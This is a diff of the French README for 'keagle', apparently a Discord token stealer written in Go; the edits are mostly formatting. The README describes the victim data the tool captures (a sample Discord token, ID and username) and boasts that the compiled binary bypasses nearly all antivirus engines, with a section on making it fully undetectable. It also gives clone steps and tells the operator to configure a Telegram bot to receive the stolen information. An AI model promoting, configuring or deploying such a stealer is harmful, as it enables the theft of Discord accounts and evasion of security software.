@@ -93,7 +93,7 @@
 
 - **Explication**:
   
-    - 🔑** Discord Token**: Affiche le jeton d'authentification Discord, qui est utilisé pour se connecter à l'API Discord en tant qu'utilisateur. Ici, le jeton est "MjA0MjU1MjIxMDE3MjE0OTc3.EG2Veq.e66-ODIyNTg2NTEwNTUzMQ".
+    - 🔑 **Discord Token**: Affiche le jeton d'authentification Discord, qui est utilisé pour se connecter à l'API Discord en tant qu'utilisateur. Ici, le jeton est "MjA0MjU1MjIxMDE3MjE0OTc3.EG2Veq.e66-ODIyNTg2NTEwNTUzMQ".
     - 🆔 **Discord ID**: Montre l'identifiant unique associé à l'utilisateur Discord. Dans cet exemple, l'ID est "204255221017214977".
     - 👤 **Username**: Indique le nom d'utilisateur utilisé sur Discord. Ici, l'utilisateur se nomme "discorduser".
     - 👥 **Global Name**: Affiche le nom global de l'utilisateur sur Discord, souvent identique au nom d'utilisateur mais peut différer. Dans cet exemple, le nom global est "user".
@@ -106,8 +106,8 @@
 
 ![image](https://github.com/gabrielctz/keagle/assets/133511026/1e71a2bc-d7b7-433c-8276-6263f4e3e8bd)
 
-- Comme nous pouvons le voir sur la capture d'écran ci-dessus, le fichier compilé permet de bypass tous les AV connus.
-- Il est malheureusment détecter par deux AV peu utilisé ainsi que celui de Google (ce qui fait que les utilisateurs Google Chrome soit prévenue d'un potentiel virus lors de l'installation)
+- Comme nous pouvons le voir sur la **capture d'écran** ci-dessus, le fichier compilé permet de bypass tous les **AV connus**.
+- Il est malheureusment détecter par **deux AV** peu utilisé ainsi que celui de **Google** (*ce qui fait que les utilisateurs Google Chrome soit prévenue d'un potentiel virus lors de l'installation*)
 
 **💡 Comment le rendre FUD (*fully undetectable*)**
 
@@ -123,8 +123,8 @@
 - [Golang](https://go.dev)
 
 ```
-git clone https://github.com/gabrielctz/anemone
-cd anemone
+git clone https://github.com/gabrielctz/keagle
+cd keagle
 ```
 
 - **Configuration**: Pour recevoir les informations sur **Telegram**, rendez vous dans le fichier *getConfig.go* et coller le **token/chat_id** de votre **bot/groupe**.
